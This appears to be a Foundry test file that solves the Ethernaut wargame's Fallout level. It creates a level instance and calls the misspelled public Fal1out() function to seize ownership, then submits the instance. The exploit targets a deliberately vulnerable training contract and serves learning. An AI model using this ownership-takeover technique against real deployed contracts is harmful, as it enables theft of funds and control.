// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "src/Fallout.sol"; 

interface IEthernaut {
    function createLevelInstance(address _level) external payable; 
    function submitLevelInstance(address _instance) external; 
}

contract EthernautTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);

    function testLevel2_Fallout() public {

        vm.deal(address(this), 1 ether);

        address levelFactoryAddress = 0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639;

        vm.recordLogs();
        console.log("Membuat Level 2 (Fallout)...");
        ethernaut.createLevelInstance(levelFactoryAddress);

        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        console.log("Target Address:", levelAddr);

        Fallout level = Fallout(levelAddr);

        console.log("Memanggil fungsi Fal1out()...");
        
        level.Fal1out();

        assertEq(level.owner(), address(this));
        console.log("HACKED! Owner berhasil diambil alih.");

        console.log("Submit ke Ethernaut...");
        ethernaut.submitLevelInstance(payable(levelAddr));
    }
    
    receive() external payable {}
}